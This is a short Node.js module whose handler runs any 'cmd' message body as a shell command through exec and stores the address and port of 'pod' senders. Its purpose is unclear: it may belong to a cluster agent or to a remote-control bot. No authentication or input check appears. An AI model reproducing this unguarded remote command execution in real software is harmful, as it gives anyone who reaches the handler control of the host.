const { exec } = require("./common")


async function defaultExtend(data,header,clients){
  const {action, body} = data
  if(action === 'cmd'){
    const result = await exec(body).catch(err=>{console.error(err)})
    return result
  }
  else if(action === 'pod'){
    clients[header.address] = header.port
  }
  return false
}



module.exports = { defaultExtend }